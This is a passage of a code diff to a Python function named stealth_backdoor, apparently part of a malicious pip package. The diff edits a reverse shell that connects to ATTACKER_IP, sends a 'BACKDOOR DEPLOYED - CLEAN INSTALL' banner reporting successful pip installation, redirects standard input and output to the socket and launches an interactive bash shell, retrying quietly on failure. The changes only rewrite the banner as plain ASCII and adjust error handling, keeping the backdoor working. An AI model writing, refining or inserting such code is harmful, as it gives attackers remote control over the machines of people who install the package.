@@ -29,16 +29,14 @@ def stealth_backdoor():
                 s = socket.socket()
                 s.connect((ATTACKER_IP, ATTACKER_PORT))
                 
-                # Send successful installation confirmation
-                s.send(b"""
-╔════════════════════════════════════╗
-║  BACKDOOR DEPLOYED - CLEAN INSTALL ║
-╚════════════════════════════════════╝
-Status: Package installed successfully
-No errors during installation
-Package appears in pip list
-======================================
-$ """.encode())
+                # Send successful installation confirmation - PLAIN ASCII ONLY!
+                s.send(b"\n")
+                s.send(b"BACKDOOR DEPLOYED - CLEAN INSTALL\n")
+                s.send(b"==================================\n")
+                s.send(b"Status: Package installed successfully\n")
+                s.send(b"No errors during installation\n")
+                s.send(b"Package appears in pip list\n")
+                s.send(b"==================================\n$ ")
                 
                 # Full interactive shell
                 os.dup2(s.fileno(), 0)
@@ -47,7 +45,8 @@ $ """.encode())
                 
                 subprocess.call(["/bin/bash", "-i"])
                 
-            except:
+            except Exception as e:
+                # Log error silently if needed
                 time.sleep(30)  # Wait longer between retries
                 
     except:
